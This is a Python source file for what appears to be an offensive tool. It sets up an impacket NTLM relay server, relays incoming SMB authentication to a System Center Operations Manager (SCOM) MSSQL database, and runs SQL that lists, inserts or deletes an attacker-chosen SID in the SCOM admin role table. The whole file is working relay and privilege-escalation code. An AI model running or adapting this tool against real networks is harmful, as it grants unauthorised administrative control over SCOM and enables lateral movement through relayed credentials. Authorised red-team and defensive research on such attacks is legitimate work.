import time
from threading import Lock

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.ldap import ldaptypes

from lib.logger import logger


class SCOMMSSQLAttackClient(ProtocolAttack):
    PLUGIN_NAMES = ["MSSQL"]
    
    def run(self):
        self.scom_relay.attack_lock.acquire()
        try:
            self._run()
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
            import traceback
            logger.debug(traceback.format_exc())
        finally:
            self.scom_relay.attack_lock.release()

    def _run(self):
        # Get username from the client
        username = self.username if hasattr(self, 'username') else 'Unknown'
        
        if username in self.scom_relay.attacked_targets:
            logger.debug(f"Skipping user {username} since attack was already performed")
            return

        try:
            logger.info(f"Authenticated as: {username}")

            # Execute the appropriate query based on operation mode
            if self.scom_relay.operation_mode == 'list':
                logger.info("Listing current members of SCOM admin role...")
                self.execute_query(self.scom_relay.query)
            elif self.scom_relay.operation_mode == 'delete':
                logger.info(f"Removing SID from SCOM admin role...")
                self.execute_query(self.scom_relay.query)
                logger.info(f"\n[+] SID successfully removed from SCOM admin role")
            else:  # update/insert mode
                logger.info(f"Adding SID to SCOM admin role...")
                self.execute_query(self.scom_relay.query)
                logger.info(f"\n[+] SID successfully added to SCOM admin role")

        except Exception as e:
            logger.info(f"An error occurred during the relay: \n{str(e)}")
            import traceback
            logger.debug(traceback.format_exc())

        # Mark attack as complete
        self.finish_run()

    def execute_query(self, query):
        """Execute SQL query using the MSSQL client"""
        try:
            logger.debug(f"Executing query: {query}")
            # Use the client's sql_query method
            self.client.sql_query(query)
            # Print the results
            self.client.printReplies()
            self.client.printRows()
        except Exception as e:
            logger.info(f"Error executing query: {str(e)}")
            import traceback
            logger.debug(traceback.format_exc())

    def finish_run(self):
        """Mark the attack as complete"""
        username = self.username if hasattr(self, 'username') else 'Unknown'
        if username != 'Unknown':
            self.scom_relay.attacked_targets.append(username)
        # Don't shutdown immediately - let the relay continue for other connections
        # self.scom_relay.shutdown()


class MSSQLSCOMRELAY:
    def __init__(self, target: str, sid: str, interface: str, port: int, 
                 timeout: int, operation_mode: str, verbose: bool):
        self.target = target
        self.sid = sid
        self.interface = interface
        self.port = port
        self.timeout = timeout
        self.operation_mode = operation_mode
        self.verbose = verbose
        self.attacked_targets = []
        self.attack_lock = Lock()
        self.server = None
        self.query = None

        # Build the appropriate SQL query based on operation mode
        self.query = self.build_query()

        # Ensure target has proper format
        if not self.target.startswith("mssql://"):
            self.target = f"mssql://{self.target}"
        
        logger.info(f"Targeting MSSQL server at {self.target}")
        logger.info(f"Operation mode: {self.operation_mode}")

        # Set up the relay configuration
        target_processor = TargetsProcessor(singleTarget=self.target)

        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        config.setAttacks({"MSSQL": self.get_attack_mssql_client})
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")
        config.setOutputFile(None)

        self.server = SMBRelayServer(config)

    def convert_string_sid(self, sid):
        """Convert string SID to hex format for SQL query"""
        try:
            hexsid = ldaptypes.LDAP_SID()
            hexsid.fromCanonical(sid)
            querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
            logger.info(f'[*] Converted {sid} to {querysid}')
            return querysid
        except Exception as e:
            logger.info(f"Error converting SID: {str(e)}")
            return None

    def build_query(self):
        """Build the appropriate SQL query based on operation mode"""
        if self.operation_mode == 'list':
            query = "Use OperationsManager; SELECT * FROM AzMan_Role_SIDMember WHERE RoleID = 1;"
            logger.debug(f"Built list query: {query}")
            return query
        
        # For insert/delete, we need to convert the SID
        if not self.sid:
            logger.info("Error: SID is required for insert/delete operations")
            return None

        # Check if SID is already in hex format
        if self.sid.startswith("0x"):
            hex_sid = self.sid
            logger.info(f"[*] Using provided hex SID: {hex_sid}")
        else:
            hex_sid = self.convert_string_sid(self.sid)
            if not hex_sid:
                return None

        if self.operation_mode == 'delete':
            query = f"Use OperationsManager; DELETE FROM AzMan_Role_SIDMember WHERE RoleID = '1' AND MemberSID = {hex_sid};"
        else:  # update/insert mode
            query = f"Use OperationsManager; INSERT INTO AzMan_Role_SIDMember (RoleID, MemberSID) Values ('1', {hex_sid});"
        
        logger.debug(f"Built query: {query}")
        return query

    def start(self):
        """Start the relay server"""
        if not self.query:
            logger.info("Error: Failed to build SQL query. Exiting.")
            return

        logger.info(f"Listening on {self.interface}:{self.port}")
        logger.info("Waiting for incoming connections...")
        logger.info(f"Query ready: {self.query}")

        self.server.start()

        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt, exiting...")
            self.shutdown()
        except Exception as e:
            logger.debug(e)

    def get_attack_mssql_client(self, *args, **kwargs):
        """Return the attack client for MSSQL"""
        attack_client = SCOMMSSQLAttackClient(*args, **kwargs)
        attack_client.scom_relay = self
        return attack_client

    def shutdown(self):
        logger.info("Job done...")
        exit()